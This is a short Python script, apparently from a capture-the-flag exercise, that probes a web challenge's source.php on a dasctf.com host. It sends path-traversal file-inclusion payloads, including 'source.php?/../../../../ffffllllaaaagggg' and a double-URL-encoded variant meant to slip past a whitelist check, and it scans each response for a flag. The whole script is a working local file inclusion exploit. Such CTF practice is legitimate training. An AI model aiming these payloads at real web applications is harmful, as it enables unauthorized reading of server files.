# -*- coding: utf-8 -*-
"""精确对比：include 是否执行（看追加内容）"""
import requests, re

base = 'http://29f3b8fe57ff6823861b7021.http-ctf2.dasctf.com:80'

tests = [
    ('无 file', None),
    ('file=source.php', 'source.php'),
    ('file=hint.php', 'hint.php'),
    ('file=source.php?/../../../../ffffllllaaaagggg', 'source.php?/../../../../ffffllllaaaagggg'),
    ('file=hint.php?/../../../../ffffllllaaaagggg', 'hint.php?/../../../../ffffllllaaaagggg'),
    ('file=source.php%253f/../../../../ffffllllaaaagggg', 'source.php%253f/../../../../ffffllllaaaagggg'),
]

for label, f in tests:
    url = base + '/source.php'
    if f:
        r = requests.get(url, params={'file': f}, timeout=12)
    else:
        r = requests.get(url, timeout=12)
    L = len(r.text)
    has_flag = bool(re.findall(r'flag\{[^}]+\}', r.text))
    has_hint = 'flag not here' in r.text
    # 看源码高亮结束后是否有追加内容（找 </code> 之后的）
    tail = r.text[-200:] if '</code>' in r.text else r.text[-200:]
    print(f'{label:<42} len={L:<6} flag={has_flag} hint={has_hint}')
    print(f'   尾部: {tail[:120].replace(chr(10), " ")}')
    print()
